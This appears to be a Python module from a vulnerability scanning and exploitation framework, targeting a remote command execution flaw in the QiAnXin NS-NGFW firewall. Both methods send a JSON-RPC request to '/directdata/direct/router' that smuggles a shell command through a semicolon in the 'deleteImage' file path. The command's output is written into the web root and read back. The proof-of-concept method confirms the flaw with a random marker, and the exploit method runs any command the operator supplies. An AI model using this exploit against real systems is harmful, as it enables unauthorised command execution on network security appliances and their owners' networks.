#!/usr/bin/env python3
# -*- coding: utf-8 -*-
import threading
from thirdparty import requests
from module import globals
from module.md5 import random_md5
from core.verify import verify
from core.verify import misinformation
from thirdparty.requests_toolbelt.utils import dump
from thirdparty.requests.compat import urljoin
import json


class QiAnXin():
    def __init__(self, url):
        self.url = url
        self.raw_data = None
        self.vul_info = {}
        self.ua = globals.get_value("UA")  # 获取全局变量UA
        self.timeout = globals.get_value("TIMEOUT")  # 获取全局变量UA
        self.headers = globals.get_value("HEADERS")  # 获取全局变量HEADERS
        self.threadLock = threading.Lock()

    def time_2021_0410_poc(self):
        self.threadLock.acquire()
        self.vul_info["prt_name"] = "QiAnXin NS-NGFW: time-2021-0410"
        self.vul_info["prt_resu"] = "null"
        self.vul_info["prt_info"] = "null"
        self.vul_info["vul_urls"] = self.url
        self.vul_info["vul_payd"] = "null"
        self.vul_info["vul_name"] = "Qianxin NS-NGFW Netkang Next Generation Firewall Front RCE"
        self.vul_info["vul_numb"] = "time-2021-0415"
        self.vul_info["vul_apps"] = "QiAnXin"
        self.vul_info["vul_date"] = "2021-04-10"
        self.vul_info["vul_vers"] = "unknow"
        self.vul_info["vul_risk"] = "high"
        self.vul_info["vul_type"] = "RCE"
        self.vul_info["vul_data"] = "null"
        self.vul_info["vul_desc"] = "Qianxin NS-NGFW Netkang Next Generation Firewall Front RCE"
        self.vul_info["cre_date"] = "2021-04-16"
        self.vul_info["cre_auth"] = "zhzyker"
        url = urljoin(self.url, "/directdata/direct/router")
        md = random_md5()
        cmd = "echo " + md
        data = {
           "action": "SSLVPN_Resource",
           "method": "deleteImage",
           "data": [{
               "data": ["/var/www/html/d.txt;" + cmd + " > /var/www/html/" + md + ".txt"]
           }],
           "type": "rpc",
           "tid": 17
        }
        data = json.dumps(data)
        try:
            request = requests.post(url, data=data, headers=self.headers, timeout=self.timeout, verify=False)
            url = urljoin(self.url, md + ".txt")
            req = requests.get(url, data="1", headers=self.headers, timeout=self.timeout, verify=False)
            if md in misinformation(req.text, md) and (md + ".txt") not in req.text and req.status_code == 200:
                self.vul_info["vul_data"] = dump.dump_all(request).decode('utf-8', 'ignore')
                self.vul_info["prt_resu"] = "PoCSuCCeSS"
                self.vul_info["vul_payd"] = data
                self.vul_info["prt_info"] = "[rce:" + url + " ]"
            verify.scan_print(self.vul_info)
        except requests.exceptions.Timeout:
            verify.timeout_print(self.vul_info["prt_name"])
        except requests.exceptions.ConnectionError:
            verify.connection_print(self.vul_info["prt_name"])
        except Exception as error:
            verify.error_print(self.vul_info["prt_name"])
        self.threadLock.release()

    def time_2021_0410_exp(self, cmd):
        vul_name = "QiAnXin NS-NGFW: time-2021-0410"
        url = urljoin(self.url, "/directdata/direct/router")
        md = random_md5()
        data = {
           "action": "SSLVPN_Resource",
           "method": "deleteImage",
           "data": [{
               "data": ["/var/www/html/d.txt;" + cmd + " > /var/www/html/" + md + ".txt"]
           }],
           "type": "rpc",
           "tid": 17
        }
        data = json.dumps(data)
        try:
            request = requests.post(url, data=data, headers=self.headers, timeout=self.timeout, verify=False)
            url = urljoin(self.url, md + ".txt")
            req = requests.get(url, data="1", headers=self.headers, timeout=self.timeout, verify=False)
            self.raw_data = dump.dump_all(request).decode('utf-8', 'ignore')
            verify.exploit_print(req.text, self.raw_data)
        except requests.exceptions.Timeout:
            verify.timeout_print(vul_name)
        except requests.exceptions.ConnectionError:
            verify.connection_print(vul_name)
        except Exception:
            verify.error_print(vul_name)
